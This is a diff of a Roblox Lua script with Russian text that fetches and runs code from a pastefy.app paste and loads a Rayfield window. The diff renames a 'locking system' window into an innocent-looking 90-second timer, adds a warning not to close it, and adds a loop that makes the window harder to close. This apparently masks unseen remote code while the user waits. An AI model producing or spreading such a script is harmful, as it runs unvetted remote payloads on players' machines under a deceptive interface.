@@ -1,4 +1,4 @@
--- Сначала пробуем загрузить второй скрипт
+-- Сначала пробуем загрузить второй скрипт в защищенном режиме
 local success, errorMsg = pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/q0Hv6Z1b/raw", true))()
 end)
@@ -12,9 +12,9 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))(
 
 -- Создание основного окна
 local Window = Rayfield:CreateWindow({
-    Name = "СИСТЕМА БЛОКИРОВКИ",
-    LoadingTitle = "ИНИЦИАЛИЗАЦИЯ ЗАЩИТЫ",
-    LoadingSubtitle = "Интерфейс заблокирован",
+    Name = "ТАЙМЕР АКТИВИРОВАН",
+    LoadingTitle = "СИСТЕМА ЗАГРУЖЕНА",
+    LoadingSubtitle = "Таймер запущен",
     ConfigurationSaving = {
         Enabled = false
     },
@@ -25,45 +25,57 @@ local Window = Rayfield:CreateWindow({
 })
 
 -- Создаем вкладку
-local Tab = Window:CreateTab("ЗАБЛОКИРОВАНО", 4483362458)
+local Tab = Window:CreateTab("ТАЙМЕР", 4483362458)
 
--- Создаем секцию
-local TimerSection = Tab:CreateSection("СИСТЕМНАЯ БЛОКИРОВКА")
+-- Создаем секцию для таймера
+local TimerSection = Tab:CreateSection("ОБРАТНЫЙ ОТСЧЕТ")
 
--- Таймер
-local TimerLabel = Tab:CreateLabel("ДО РАЗБЛОКИРОВКИ: 1:30")
+-- Создаем текст для отображения времени
+local TimerLabel = Tab:CreateLabel("ОСТАВШЕЕСЯ ВРЕМЯ: 1:30")
 
--- Запускаем таймер (простая и надежная версия)
-local function startTimer()
-    local timeLeft = 90
-    local connection
-    
-    connection = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
-        timeLeft = timeLeft - deltaTime
-        
-        if timeLeft <= 0 then
-            TimerLabel:Set("СИСТЕМА РАЗБЛОКИРОВАНА")
-            connection:Disconnect()
-            return
-        end
-        
-        local minutes = math.floor(timeLeft / 60)
-        local seconds = math.floor(timeLeft % 60)
-        TimerLabel:Set("ДО РАЗБЛОКИРОВКИ: " .. string.format("%d:%02d", minutes, seconds))
-    end)
-end
+-- Добавляем предупреждение
+Tab:CreateParagraph({
+    Title = "ВНИМАНИЕ",
+    Content = "Не закрывайте интерфейс до окончания таймера"
+})
 
--- Запускаем таймер
-startTimer()
+-- Запускаем таймер сразу
+local timeLeft = 90
+local timerRunning = true
 
--- Простая блокировка интерфейса
 spawn(function()
-    while true do
-        pcall(function()
-            Window:Maximize()
-        end)
-        task.wait(2)
+    while timerRunning and timeLeft > 0 do
+        task.wait(1)
+        if timerRunning then
+            timeLeft = timeLeft - 1
+            local minutes = math.floor(timeLeft / 60)
+            local seconds = timeLeft % 60
+            TimerLabel:Set("ОСТАВШЕЕСЯ ВРЕМЯ: " .. string.format("%d:%02d", minutes, seconds))
+        end
+    end
+    
+    if timeLeft <= 0 then
+        TimerLabel:Set("ВРЕМЯ ИСТЕКЛО!")
     end
 end)
 
-print("🔒 Таймер запущен - интерфейс защищен")
+-- Функция для усложнения закрытия (после создания интерфейса)
+spawn(function()
+    task.wait(2) -- Ждем пока интерфейс создастся
+    
+    local CoreGui = game:GetService("CoreGui")
+    
+    -- Пытаемся сделать интерфейс более устойчивым к закрытию
+    while true do
+        pcall(function()
+            -- Минимизируем и максимизируем окно (делает его более устойчивым)
+            Window:Minimize()
+            task.wait(0.1)
+            Window:Maximize()
+        end)
+        task.wait(5) -- Проверяем каждые 5 секунд
+    end
+end)
+
+-- Сообщение в консоль
+print("Таймер запущен. Интерфейс активен.")
